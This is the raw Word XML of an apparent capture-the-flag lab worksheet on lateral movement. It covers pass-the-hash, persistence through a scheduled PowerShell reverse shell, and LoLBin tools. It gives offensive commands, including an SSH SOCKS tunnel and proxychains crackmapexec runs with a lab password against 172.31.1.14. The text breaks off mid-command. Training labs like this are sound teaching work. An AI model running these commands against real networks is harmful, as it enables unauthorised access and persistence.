        <w:spacing w:before="5" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1366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Leverage a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p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as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-the-h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4"/>
          <w:szCs w:val="24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h at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k to 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a hardened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w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ork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ta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ion. Establ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i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h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p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er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iste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t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acc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s u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ing a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at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ve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hedul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d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ask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that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lau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hes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a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teal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hy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Po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w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erShell reve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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r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e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hell, and c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p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ture the flag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onfir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m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ing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p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er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ist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nce.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ls &amp; T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hn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iqu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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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 xml:space="preserve">s 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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ou’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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 xml:space="preserve">l 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U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se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ck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xec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 xml:space="preserve">– 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o pe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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spacing w:val="-3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m pa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spacing w:val="2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-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e-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 xml:space="preserve"> a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tt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cks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Impac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k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et (e.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g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 xml:space="preserve">., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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sex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c.py)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 xml:space="preserve">– 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o gain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ell a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ce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v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ia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B</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ower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 xml:space="preserve">hell – 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cr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spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v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 xml:space="preserve">erse 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 xml:space="preserve">hell </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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sing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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v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e to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ling</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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LoL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(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w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er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 xml:space="preserve">hell, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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er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uti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.exe,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="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spacing w:val="-3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spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>k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s.exe)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 xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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o c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pe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spacing w:val="-3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 xml:space="preserve">ent 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k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 xml:space="preserve">sing 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uil</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="3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 xml:space="preserve">-in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ls</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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y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hon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 xml:space="preserve">– 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ser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v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 xml:space="preserve">er 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he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spacing w:val="-3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 xml:space="preserve">ware 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v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 xml:space="preserve">ia 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TT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P</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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 xml:space="preserve">t – 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 xml:space="preserve">o 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v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erse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 xml:space="preserve">shell </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ectio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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ep-b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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>y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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>S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 xml:space="preserve">tep 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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st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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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1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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Move Laterally</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2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to</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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172</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.3</w:t>
      </w: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1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.</w:t>
      </w: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1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.</w:t>
      </w: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1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 xml:space="preserve">4 and log in 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>us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ing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2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 xml:space="preserve">a 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>p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as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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>w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 xml:space="preserve">ord, </w:t>
      </w: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t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hen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2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>p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as</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t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h</w:t>
      </w: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-ha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h</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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St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K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li</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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If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y,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he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SS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un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el</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">D 1080 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>N moo@&lt;target_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Att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empt 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ss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w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or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-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login wi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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k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x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 (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line):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="110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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo proxychains crackmapexec smb 172.31.1.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">u moo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p letmein - x "whoami"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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When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mp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, enter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k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i’s p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ss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w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ord</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="19"/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pict>
          <v:group id="_x0000_s1089" style="position:absolute;left:0;text-align:left;margin-left:310.2pt;margin-top:11.75pt;width:220.9pt;height:.75pt;z-index:-1886;mso-position-horizontal-relative:page" coordorigin="6204,235" coordsize="4418,15">
            <v:shape id="_x0000_s1091" style="position:absolute;left:6211;top:243;width:1651;height:0" coordorigin="6211,243" coordsize="1651,0" path="m6211,243r1651,e" filled="f" strokecolor="#404040" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1090" style="position:absolute;left:7866;top:243;width:2748;height:0" coordorigin="7866,243" coordsize="2748,0" path="m7866,243r2748,e" filled="f" strokecolor="#404040" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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e.  </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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id</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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t</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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he</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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tt</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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empt </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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s</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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uc</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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c</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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ed</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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o</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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r</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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fa</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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il?</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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If</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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so, </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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w</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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hy?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="18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Att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empt pa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-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-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sh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g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in wi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nn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'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4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ha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sh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(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 li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e):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo proxychains crackmapexec smb 172.31.1.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
